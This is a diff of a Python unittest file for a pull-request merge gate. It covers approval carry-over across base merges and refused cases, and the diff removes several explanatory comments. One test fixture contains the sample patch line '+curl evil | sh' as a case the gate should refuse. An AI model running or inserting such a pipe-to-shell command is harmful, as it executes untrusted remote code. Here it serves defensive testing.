@@ -176,7 +176,6 @@ class ATrustedApprovalLiftsAHighPath(unittest.TestCase):
         )
 
     def test_a_floor_path_holds_without_that_approval(self) -> None:
-        # A high path is not a person's (owner decision 2026-10-30, #11020).
         later = "2026-10-26T17:20:00Z"
         cases = {
             "no review": [],
@@ -211,9 +210,6 @@ class ATrustedApprovalLiftsAHighPath(unittest.TestCase):
         self.assertNotIn("high-path", str(cost))
 
 
-# An approval of an earlier head carried over base merges (#10224): Kyle
-# (id 5) approved OLD, then a lane merged the base into it, so the head is a
-# merge whose resolve-config change is the one OLD made.
 OLD = "c" * 40
 MAIN = "5" * 40
 CARRIED_PR = PR | {
@@ -243,13 +239,10 @@ TIP = "3" * 40
 MB_OLD = "1" * 40
 MB_HEAD = "2" * 40
 BASE_DOC = {"filename": "docs/base.md", "status": "modified", "patch": "+q"}
-# #10224's shape: main changed a file the pull request also changes, so the
-# net change moved by hunk headers while main's own hunk applies the same.
 SHARED = ".github/actions/collect-base-activity/collect-base-activity.test.mjs"
 SHARED_OLD = {"filename": SHARED, "status": "modified", "patch": "@@ -93 +93 @@\n+mine"}
 SHARED_HEAD = SHARED_OLD | {"patch": "@@ -98 +98 @@\n+mine"}
 SHARED_BASE = {"filename": SHARED, "status": "modified", "patch": "@@ -10 +10 @@\n+theirs"}
-# GitHub's stale-review dismissal on the base merge's push.
 STALE = {
     "event": "review_dismissed",
     "actor": {"login": "lanes[bot]", "type": "Bot"},
@@ -445,8 +438,6 @@ class ALiftCarriesOverABaseMerge(unittest.TestCase):
         )
         self.assertIn(f"repos/{REPO}/git/trees/{HEAD}?recursive=1", reads)
         self.assertIn(f"repos/{REPO}/git/trees/{MB_HEAD}?recursive=1", reads)
-        # The independent security review of #10671: modes come from the
-        # trees, and only a base that is the default branch carries.
         refused = {
             "a merge that also flips a base file's mode": {"trees": {HEAD: tree(*PATHS, flipped="docs/base.md"), MB_HEAD: tree(*PATHS)}},
             "a truncated tree": {"trees": {HEAD: tree(*PATHS), MB_HEAD: tree(*PATHS, truncated=True)}},
@@ -484,8 +475,6 @@ class ALiftCarriesOverABaseMerge(unittest.TestCase):
                 "head_files": [HELD_PATCH | {"patch": "+evil"}],
                 "across": ranges([BASE_DOC, HELD_PATCH | {"patch": "+evil"}], [BASE_DOC]),
             },
-            # The re-review of #10596: a merge that rewrites a non-hold file
-            # the approved head changed, or adds one the base touched.
             "a merge that rewrites scripts/helper.sh": {
                 "old_files": [HELD_PATCH, HELPER],
                 "head_files": [HELD_PATCH, HELPER | {"patch": "+curl evil | sh"}],
@@ -517,8 +506,6 @@ class ALiftCarriesOverABaseMerge(unittest.TestCase):
                     {"sha": HEAD, "parents": [{"sha": OLD}, {"sha": OTHER}]},
                 ],
             },
-            # The third security review of #10596: the head judged moved
-            # before the re-read, or the compare is cut short.
             "a head that moved since it was read": {
                 "head_files": [HELD_PATCH],
                 "now_head": "9" * 40,
@@ -536,7 +523,6 @@ class ALiftCarriesOverABaseMerge(unittest.TestCase):
                 "head_files": [HELD_PATCH],
                 "pr": CARRIED_PR | {"head": CARRIED_PR["head"] | {"repo": None}},
             },
-            # A dismissed approval counts only as GitHub's stale dismissal.
             "a dismissed approval with no dismissal event": {
                 "head_files": [HELD_PATCH],
                 "reviews": [approval("DISMISSED")],
@@ -637,10 +623,6 @@ class LaneRiskRefusal(unittest.TestCase):
         self.assertEqual(held[1:], (False, False))
 
     def test_only_a_security_finding_needs_a_person(self) -> None:
-        # Owner rule 2026-10-26: unbound review evidence, the manifest review
-        # and a failed read go back to the lanes; a CRITICAL finding stays a
-        # person's. A symlink or submodule (an unsafe path) holds but is not a
-        # person's (owner decision 2026-10-30, #11020).
         after = PLUGIN_BASE.replace('"name": "foo",', '"name": "foo", "hooks": {},')
         unproven = babysit_merge.HeadPusherUnproven("head-pusher-unproven:a")
         cases = {
@@ -656,11 +638,6 @@ class LaneRiskRefusal(unittest.TestCase):
                 self.assertIs(held[1], person, held)
 
 
-# An enforcement floor path (`Floor.review`) the gate holds as
-# `review-path:` until the security review binds clean (owner decision Q26
-# option B), as pull request #10908 was held: its security lane bound to the
-# head with open findings below CRITICAL that the lanes App resolved, which
-# only a clean whole review of the head closes (`whole_review_clears`).
 REVIEWED = dataclasses.replace(DOC, path=".github/scripts/pr-unblock/gate-source.mjs")
 
 
